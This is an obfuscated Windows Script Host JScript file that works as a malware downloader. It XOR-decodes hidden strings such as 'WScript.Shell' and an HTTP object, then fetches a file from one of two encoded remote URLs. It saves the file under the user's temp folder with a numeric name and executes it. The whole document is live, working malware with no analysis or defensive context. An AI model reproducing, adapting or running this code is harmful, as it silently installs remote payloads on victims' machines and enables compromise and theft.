function btoa(resonantSdr, frontiertu3, conscientiousR9G, bequeathKqu, disaffectedYrU) {
    var canonjvH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var embroilXwn = String(disaffectedYrU);
    for (var dulcetMsD, defrayFEe, arbitraryiz1 = 0, renderG8j = canonjvH, irresolutewal = ""; embroilXwn.charAt(arbitraryiz1 | 0) || (renderG8j = "=", 
    arbitraryiz1 % 1); irresolutewal += renderG8j.charAt(63 & dulcetMsD >> 8 - arbitraryiz1 % 1 * 8)) {
        defrayFEe = embroilXwn.charCodeAt(arbitraryiz1 += 3 / 4);
        if (defrayFEe > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        dulcetMsD = dulcetMsD << 8 | defrayFEe;
    }
    return irresolutewal;
}

var passageQAt = function(frustrateQTb) {
    var hewsGZ = "";
    var resonantSdr = "tractGQN";
    var frontiertu3 = "refectoryu80";
    var conscientiousR9G = "grandiloquentrDx";
    var bequeathKqu = "ignominiousvC1";
    btoa(resonantSdr, frontiertu3, conscientiousR9G, bequeathKqu, [ 138, 86, 35, 187, 168, 2, 170, 56, 51, 88, 20, 116, 162, 95, 103, 140 ]);
    var consecratekdB = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var venturesvq = 0; venturesvq < frustrateQTb.length; venturesvq++) {
        var practitionergiL = [ 138, 86, 35, 187, 168, 2, 170, 56, 51, 88, 20, 116, 162, 95, 103, 140 ];
        hewsGZ += consecratekdB(frustrateQTb[venturesvq] ^ practitionergiL[venturesvq % practitionergiL.length]);
    }
    return hewsGZ;
};

var unaffectedwZu = function() {
    var cogentzjM = function() {
        var ostensibleI9O = passageQAt([ 223, 16, 64, 137, 222, 110, 204, 123, 75, 54 ]);
        var practiceuNM = passageQAt([ 224, 111, 103, 245, 248, 113, 199, 12, 123, 27 ]);
    };
    cogentzjM.prototype.AuCigVwgvU = function(unexceptionableCxA) {
        var testatorfc5 = passageQAt([ 201, 36, 70, 218, 220, 103, 229, 90, 89, 61, 119, 0 ]);
        return wsh[testatorfc5](unexceptionableCxA);
    };
    cogentzjM.prototype.Bz7MNFKTaI = function(unexceptionableCxA) {
        var testatorfc5 = passageQAt([ 201, 36, 70, 218, 220, 103, 229, 90, 89, 61, 119, 0 ]);
        return WScript[testatorfc5](unexceptionableCxA);
    };
    return cogentzjM;
}();

(function() {
    var wantonvBT = [ passageQAt([ 226, 34, 87, 203, 146, 45, 133, 80, 67, 57, 102, 17, 219, 48, 18, 228, 239, 36, 70, 202, 217, 44, 201, 87, 94, 119, 44, 68, 140, 58, 31, 233 ]), passageQAt([ 226, 34, 87, 203, 146, 45, 133, 80, 67, 57, 120, 7, 205, 40, 6, 226, 254, 37, 69, 221, 134, 97, 197, 85, 28, 96, 36, 90, 199, 39, 2 ]) ];
    var undertakingrD6 = 4194304;
    var unimpeachablePZS = new unaffectedwZu();
    var impartQ6t = unimpeachablePZS[passageQAt([ 200, 44, 20, 246, 230, 68, 225, 108, 82, 17 ])];
    var flotillaJfg = impartQ6t(passageQAt([ 221, 5, 64, 201, 193, 114, 222, 22, 96, 48, 113, 24, 206 ]));
    var wheedleCoP = impartQ6t(passageQAt([ 199, 5, 123, 246, 228, 48, 132, 96, 126, 20, 92, 32, 246, 15 ]));
    var plusfeL = impartQ6t(passageQAt([ 203, 18, 108, 255, 234, 44, 249, 76, 65, 61, 117, 25 ]));
    var brookLN9 = flotillaJfg.ExpandEnvironmentStrings(passageQAt([ 175, 2, 102, 246, 248, 39, 246 ]));
    var balefulCrd = brookLN9 + undertakingrD6 + passageQAt([ 164, 51, 91, 222 ]);
    var asunderJ1O = false;
    var warrantbVZ = 200;
    for (var adjurenmF = 0; adjurenmF < wantonvBT.length; adjurenmF++) {
        try {
            var invocationlkP = wantonvBT[adjurenmF];
            wheedleCoP.open(passageQAt([ 205, 19, 119 ]), invocationlkP, false);
            wheedleCoP.send();
            if (wheedleCoP.status == warrantbVZ) {
                try {
                    plusfeL[passageQAt([ 229, 38, 70, 213 ])]();
                    plusfeL.type = 1;
                    plusfeL[passageQAt([ 253, 36, 74, 207, 205 ])](wheedleCoP[passageQAt([ 248, 51, 80, 203, 199, 108, 217, 93, 113, 55, 112, 13 ])]);
                    var cadaverousqzJ = passageQAt([ 194, 20, 81, 217, 156, 117, 196, 114, 71, 19 ]);
                    var leagueVJx = passageQAt([ 235, 60, 80, 195, 198, 74, 218, 83, 64, 19 ]);
                    var ebbW1S = Math.pow(2, 10) * 249;
                    if (plusfeL.size > ebbW1S) {
                        adjurenmF = wantonvBT.length;
                        plusfeL.position = 0;
                        plusfeL.saveToFile(balefulCrd, 2);
                        asunderJ1O = true;
                    }
                } finally {
                    plusfeL.close();
                }
            }
        } catch (ignored) {}
    }
    if (asunderJ1O) {
        flotillaJfg[passageQAt([ 207, 46, 70, 216 ])](brookLN9 + Math.pow(2, 22));
    }
})();